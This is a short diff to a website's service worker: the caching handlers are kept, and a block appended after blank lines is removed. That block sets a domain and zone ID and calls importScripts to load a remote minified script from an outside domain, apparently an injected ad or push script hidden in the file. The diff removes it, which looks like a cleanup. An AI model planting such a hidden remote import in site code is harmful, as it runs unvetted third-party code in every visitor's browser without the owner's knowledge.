@@ -32,12 +32,3 @@ self.addEventListener("fetch", (e) => {
   if (/\.(png|jpe?g|webp|gif|svg|ico|woff2?)$/i.test(p)) { e.respondWith(staleWhileRevalidate(req, STATIC)); return; }
   e.respondWith(networkFirst(req, PAGES));
 });
-
-
-
-self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 11956845
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
